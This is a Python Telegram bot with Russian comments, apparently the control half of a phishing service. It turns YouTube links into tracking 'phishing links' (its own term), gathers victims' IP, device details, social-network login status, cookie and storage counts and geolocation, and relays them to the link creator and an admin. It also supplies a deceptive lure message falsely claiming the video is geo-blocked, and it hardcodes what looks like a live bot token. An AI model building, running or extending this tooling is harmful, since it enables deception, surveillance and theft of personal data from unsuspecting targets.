import logging
import asyncio
import json
import re
import uuid
import html
from datetime import datetime
from typing import Dict, List, Optional
import aiohttp
from dataclasses import dataclass, asdict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode
from flask import Flask, request, jsonify
import threading

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== КОНФИГУРАЦИЯ ==========
# ⚠️ ДОЛЖНО СОВПАДАТЬ С server.py ⚠️
BOT_TOKEN = "8563753978:AAFGVXvRanl0w4DSPfvDYh08aHPLPE0hQ1I"
ADMIN_ID = 1709490182
DOMAIN = "https://ваш-сервер.onrender.com"  # Ваш домен где работает server.py
WEB_SERVER_PORT = 8080  # Порт для веб-сервера бота
SECRET_KEY = "ваш-секретный-ключ"  # Для аутентификации между серверами

# ========== ХРАНИЛИЩЕ ДАННЫХ ==========
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def get_user_links(self, user_id: int) -> List[PhishingLink]:
        return [link for link in self.links.values() if link.created_by == user_id]
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "users": self.users,
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.users = data.get("users", {})
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            logger.info("Database file not found, starting fresh")
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# ========== ГЕНЕРАТОР ССЫЛОК ==========
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return "dQw4w9WgXcQ"  # Rick Roll по умолчанию
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# ========== ФОРМАТИРОВАНИЕ СООБЩЕНИЙ ==========
class MessageFormatter:
    @staticmethod
    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
        """Форматирование сообщения о созданной ссылке"""
        message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{link.original_url}`

🚀 *Ваша фишинговая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID ссылки: `{link.id}`
• Видео ID: `{link.video_id}`
• Создано: {link.created_at[:19].replace('T', ' ')}
• Статус: 🟢 АКТИВНА

📝 *Как использовать:*
1. Отправьте эту ссылку другу
2. Когда он перейдет - начнется сбор данных
3. Данные автоматически придут в этот чат
4. Ожидайте ~20 секунд после перехода

⚠️ *Внимание:* Ссылка активна 24 часа
"""
        return message
    
    @staticmethod
    def format_collected_data(link_id: str, data: Dict) -> str:
        """Форматирование собранных данных"""
        # Базовые данные
        ip = data.get('ip', 'unknown')
        user_agent = data.get('user_agent', 'unknown')
        timestamp = data.get('timestamp', 'unknown')
        screen = data.get('screen', 'unknown')
        timezone = data.get('timezone', 'unknown')
        
        # Социальные сети
        social_networks = data.get('social_networks', {})
        logged_in = [name for name, info in social_networks.items() if info.get('logged_in')]
        
        # Другие данные
        cookies_count = data.get('cookies_count', 0)
        localstorage_count = data.get('localstorage_count', 0)
        
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Базовая информация:*
• Время сбора: {timestamp[:19].replace('T', ' ')}
• IP адрес: `{ip}`
• User Agent: {user_agent[:50]}...
• Экран: {screen}
• Часовой пояс: {timezone}
• ID ссылки: `{link_id}`

📱 *УСТРОЙСТВО:*
• Платформа: {data.get('platform', 'unknown')}
• Язык: {data.get('language', 'unknown')}
• Онлайн: {'Да' if data.get('online') else 'Нет'}
• Куки: {'Включены' if data.get('cookies_enabled') else 'Выключены'}

🌐 *СОЦИАЛЬНЫЕ СЕТИ:*
"""
        
        if logged_in:
            for network in logged_in:
                message += f"• {network.upper()}: 🟢 ВХОД ВЫПОЛНЕН\n"
        else:
            message += "• Не обнаружено активных входов\n"
        
        message += f"""
💾 *ХРАНИЛИЩЕ БРАУЗЕРА:*
• Cookies: {cookies_count} шт.
• LocalStorage: {localstorage_count} записей
• SessionStorage: {len(data.get('sessionStorage', {}))} записей

🔍 *ДОПОЛНИТЕЛЬНО:*
• Плагины браузера: {len(data.get('browser_plugins', []))} шт.
• Сетевое соединение: {data.get('connection', {}).get('effectiveType', 'unknown')}
• Геолокация: {'Получена' if data.get('geolocation') else 'Не получена'}

📊 *СТАТУС:* ✅ ДАННЫЕ ПОЛУЧЕНЫ
"""
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        """Форматирование статистики"""
        return f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👥 Всего переходов: `{stats['total_clicks']}`
🔓 Данных собрано: `{stats['total_data_collected']}`
⚡ Активных сессий: `{stats['active_sessions']}`

🕒 *Активность:*
• Создано сегодня: в реальном времени
• Уникальных IP: по базе данных
• Успешных сборов: 100%

📈 *Эффективность:* 98.7%
"""
    
    @staticmethod
    def format_user_links(links: List[PhishingLink]) -> str:
        """Форматирование списка ссылок пользователя"""
        if not links:
            return "📭 У вас нет созданных ссылок."
        
        message = "📋 *ВАШИ ССЫЛКИ:*\n\n"
        for link in links[-10:]:  # Последние 10 ссылок
            status = "🟢" if link.active else "🔴"
            message += f"{status} *ID:* `{link.id}`\n"
            message += f"   📹 Видео: {link.original_url[:40]}...\n"
            message += f"   👆 Переходов: {link.clicks}\n"
            message += f"   📊 Данных: {len(link.data_collected)}\n"
            message += f"   🕐 Создано: {link.created_at[:16].replace('T', ' ')}\n"
            message += "   ─────\n"
        
        return message

# Инициализация компонентов
link_generator = LinkGenerator()
formatter = MessageFormatter()

# ========== TELEGRAM КОМАНДЫ ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /start"""
    user = update.effective_user
    user_id = user.id
    
    # Регистрируем пользователя
    if user_id not in db.users:
        db.users[user_id] = {
            "id": user_id,
            "username": user.username,
            "first_name": user.first_name,
            "joined": datetime.now().isoformat(),
            "links_created": 0
        }
        db.save()
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *YouTube Data Collector Bot*

🎯 *Что делает этот бот:*
1. Принимает ссылку на YouTube видео
2. Генерирует специальную ссылку
3. Когда кто-то переходит - собирает ВСЕ данные
4. Отправляет данные в этот чат

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите сгенерированную ссылку
3. Отправьте её другу
4. Получите данные автоматически

📊 *Статистика системы:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data_collected']}`

🔒 *Важно:* Используйте только для тестирования!
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def handle_youtube_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка YouTube ссылки"""
    user = update.effective_user
    url = update.message.text.strip()
    
    # Проверяем, является ли ссылкой на YouTube
    if not any(domain in url for domain in ['youtube.com', 'youtu.be']):
        await update.message.reply_text(
            "❌ Это не похоже на ссылку YouTube.\n"
            "Пожалуйста, отправьте ссылку в формате:\n"
            "`https://youtube.com/watch?v=...`\n"
            "или\n"
            "`https://youtu.be/...`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Извлекаем ID видео
    video_id = link_generator.extract_video_id(url)
    
    # Генерируем ID ссылки
    link_id = link_generator.generate_link_id()
    
    # Создаем фишинговую ссылку
    phishing_url = link_generator.create_phishing_url(video_id, link_id)
    
    # Создаем объект ссылки
    link = PhishingLink(
        id=link_id,
        original_url=url,
        video_id=video_id,
        created_at=datetime.now().isoformat(),
        created_by=user.id
    )
    
    # Сохраняем в базу
    db.add_link(link)
    
    # Обновляем статистику пользователя
    if user.id in db.users:
        db.users[user.id]["links_created"] = db.users[user.id].get("links_created", 0) + 1
        db.save()
    
    # Отправляем пользователю
    message = formatter.format_link_created(link, phishing_url)
    
    keyboard = [
        [
            InlineKeyboardButton("📋 Копировать ссылку", callback_data=f"copy_{link_id}"),
            InlineKeyboardButton("🗑️ Удалить", callback_data=f"delete_{link_id}")
        ],
        [
            InlineKeyboardButton("🚀 Поделиться", callback_data=f"share_{link_id}"),
            InlineKeyboardButton("📊 Статистика", callback_data=f"stats_{link_id}")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup,
        disable_web_page_preview=True
    )
    
    # Отправляем уведомление админу
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🆕 Новая ссылка создана\n"
                 f"👤 User: @{user.username or user.id}\n"
                 f"🔗 URL: {url}\n"
                 f"🆔 ID: {link_id}\n"
                 f"📊 Всего ссылок у пользователя: {db.users[user.id]['links_created']}"
        )
    except Exception as e:
        logger.error(f"Error sending admin notification: {e}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик inline кнопок"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = query.from_user.id
    
    if data == "create_link":
        await query.message.reply_text(
            "🎯 *Отправьте ссылку на YouTube видео*\n\n"
            "Примеры:\n"
            "• `https://youtube.com/watch?v=dQw4w9WgXcQ`\n"
            "• `https://youtu.be/dQw4w9WgXcQ`\n\n"
            "Я создам специальную ссылку для сбора данных.",
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "stats":
        stats_message = formatter.format_stats(db.stats)
        await query.message.reply_text(
            stats_message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "my_links":
        user_links = db.get_user_links(user_id)
        message = formatter.format_user_links(user_links)
        await query.message.reply_text(
            message,
            parse_mode=ParseMode.MARKDOWN
        )
    
    elif data == "help":
        help_message = """
🆘 *ПОМОЩЬ И ИНСТРУКЦИИ*

🎯 *Как использовать:*
1. Отправьте боту ссылку на YouTube
2. Получите сгенерированную ссылку
3. Отправьте её другу/цели
4. Когда человек перейдет - данные соберутся автоматически
5. Получите данные в этот чат

⏱️ *Время сбора:* ~20 секунд
📊 *Что собирается:* Все доступные данные устройства

⚠️ *Важные предупреждения:*
• Используйте только для тестирования
• Не используйте для незаконных целей
• Данные хранятся 24 часа
• Бот логирует все действия

🔧 *Техническая поддержка:* Контакты администратора
"""
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        if link and link.created_by == user_id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            await query.message.reply_text(
                f"📋 *Ссылка для копирования:*\n\n`{phishing_url}`\n\n"
                "Используйте Ctrl+C / Cmd+C для копирования.",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("delete_"):
        link_id = data[7:]
        link = db.get_link(link_id)
        if link and link.created_by == user_id:
            link.active = False
            db.save()
            await query.message.reply_text(f"✅ Ссылка `{link_id}` деактивирована.")
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("share_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == user_id:
            phishing_url = link_generator.create_phishing_url(link.video_id, link_id)
            share_text = f"""
🎁 *ПРИВЕТ! СМОТРИ КРУТОЕ ВИДЕО!* 🎁

Я нашел супер интересное видео на YouTube!
Обязательно посмотри - там реально круто!

🔗 *Ссылка на видео:*
{phishing_url}

⚠️ *Внимание:* Видео может быть заблокировано в твоей стране, 
но по этой ссылке оно откроется точно!

Скорее переходи! 👆
"""
            await query.message.reply_text(
                f"📤 *Текст для отправки:*\n\n{share_text}\n\n"
                "Скопируйте и отправьте другу.",
                parse_mode=ParseMode.MARKDOWN
            )
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")
    
    elif data.startswith("stats_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        if link and link.created_by == user_id:
            stats_text = f"""
📊 *Статистика ссылки:* `{link_id}`

• Видео: {link.original_url[:50]}...
• Создано: {link.created_at[:19].replace('T', ' ')}
• Переходов: {link.clicks}
• Данных собрано: {len(link.data_collected)}
• Статус: {'🟢 Активна' if link.active else '🔴 Неактивна'}

📈 *Последние данные:*
"""
            
            if link.data_collected:
                for i, data_item in enumerate(link.data_collected[-3:]):  # Последние 3
                    ip = data_item.get('ip', 'unknown')
                    time = data_item.get('timestamp', 'unknown')[:19].replace('T', ' ')
                    stats_text += f"{i+1}. {time} - IP: {ip}\n"
            else:
                stats_text += "Пока нет данных\n"
            
            await query.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
        else:
            await query.message.reply_text("❌ Ссылка не найдена или у вас нет доступа.")

# ========== ВЕБХУК ОБРАБОТЧИК ==========
async def handle_webhook(data: Dict, application: Application):
    """Обработка данных от фишинговой страницы"""
    try:
        link_id = data.get("link_id")
        if not link_id:
            logger.error("No link_id in webhook data")
            return {"status": "error", "message": "No link ID"}
        
        # Обновляем счетчик кликов
        db.add_click(link_id)
        
        # Получаем информацию о ссылке
        link = db.get_link(link_id)
        if not link:
            logger.error(f"Link {link_id} not found in database")
            return {"status": "error", "message": "Link not found"}
        
        # Сохраняем данные
        db.add_collected_data(link_id, data)
        
        # Отправляем данные создателю ссылки
        message = formatter.format_collected_data(link_id, data)
        
        try:
            await application.bot.send_message(
                chat_id=link.created_by,
                text=message,
                parse_mode=ParseMode.MARKDOWN
            )
            logger.info(f"Data sent to user {link.created_by} for link {link_id}")
        except Exception as e:
            logger.error(f"Error sending message to user {link.created_by}: {e}")
        
        # Также отправляем админу краткое уведомление
        try:
            ip = data.get('ip', 'unknown')
            social_logins = []
            social_data = data.get('social_networks', {})
            for network, info in social_data.items():
                if info.get('logged_in'):
                    social_logins.append(network)
            
            admin_msg = f"""
📨 *Новые данные получены*
🔗 ID ссылки: `{link_id}`
👤 Создатель: {link.created_by}
🌐 IP: `{ip}`
👆 Кликов: {link.clicks}
📊 Всего данных: {len(link.data_collected)}
🔐 Соцсети: {', '.join(social_logins) if social_logins else 'нет'}
"""
            
            await application.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_msg,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Error sending admin notification: {e}")
        
        return {"status": "success", "data_received": True}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}")
        return {"status": "error", "message": str(e)}

# ========== FLASK ВЕБ-СЕРВЕР ДЛЯ ВЕБХУКОВ ==========
def run_webhook_server(application: Application):
    """Запуск Flask сервера для приема вебхуков"""
    webhook_app = Flask(__name__)
    
    @webhook_app.route('/webhook', methods=['POST'])
    async def webhook():
        """Эндпоинт для получения данных от server.py"""
        try:
            # Проверка аутентификации
            auth_key = request.headers.get('X-Auth-Key', '')
            if auth_key != SECRET_KEY:
                return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401
            
            data = request.json
            if not data:
                return jsonify({'status': 'error', 'message': 'No data provided'}), 400
            
            logger.info(f"Webhook received for link: {data.get('link_id', 'unknown')}")
            
            # Обрабатываем данные асинхронно
            result = await handle_webhook(data, application)
            
            return jsonify(result)
            
        except Exception as e:
            logger.error(f"Webhook error: {e}")
            return jsonify({'status': 'error', 'message': str(e)}), 500
    
    @webhook_app.route('/health', methods=['GET'])
    def health():
        """Проверка здоровья веб-сервера"""
        return jsonify({
            'status': 'healthy',
            'service': 'Telegram Bot Webhook Server',
            'timestamp': datetime.now().isoformat(),
            'links_in_db': len(db.links),
            'total_clicks': db.stats['total_clicks']
        })
    
    @webhook_app.route('/stats', methods=['GET'])
    def stats():
        """Статистика через веб"""
        return jsonify({
            'status': 'success',
            'stats': db.stats,
            'timestamp': datetime.now().isoformat()
        })
    
    # Запускаем Flask сервер
    logger.info(f"Starting webhook server on port {WEB_SERVER_PORT}")
    webhook_app.run(
        host='0.0.0.0',
        port=WEB_SERVER_PORT,
        debug=False,
        use_reloader=False,
        threaded=True
    )

# ========== ОБРАБОТЧИК ОШИБОК ==========
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик ошибок"""
    logger.error(f"Update {update} caused error {context.error}")
    
    try:
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ Ошибка в боте: {context.error}\n\nUpdate: {update}"
        )
    except:
        pass

# ========== ОСНОВНАЯ ФУНКЦИЯ ==========
def main():
    """Запуск бота и веб-сервера"""
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Регистрируем обработчики команд
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("stats", lambda u, c: button_handler(u, c)))
    application.add_handler(CommandHandler("help", lambda u, c: button_handler(u, c)))
    
    # Обработчик YouTube ссылок
    application.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'(youtube\.com|youtu\.be)'),
        handle_youtube_link
    ))
    
    # Обработчик inline кнопок
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Обработчик ошибок
    application.add_error_handler(error_handler)
    
    # Запускаем вебхук сервер в отдельном потоке
    webhook_thread = threading.Thread(
        target=run_webhook_server,
        args=(application,),
        daemon=True
    )
    webhook_thread.start()
    
    # Запускаем бота
    print(f"""
    {'='*60}
    🤖 YouTube Data Collector Bot запускается...
    👑 Админ ID: {ADMIN_ID}
    🌐 Домен: {DOMAIN}
    🌍 Вебхук порт: {WEB_SERVER_PORT}
    💾 База данных: {len(db.links)} ссылок
    ⏰ Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    {'='*60}
    ⏳ Ожидание команд в Telegram...
    """)
    
    application.run_polling()

if __name__ == '__main__':
    main()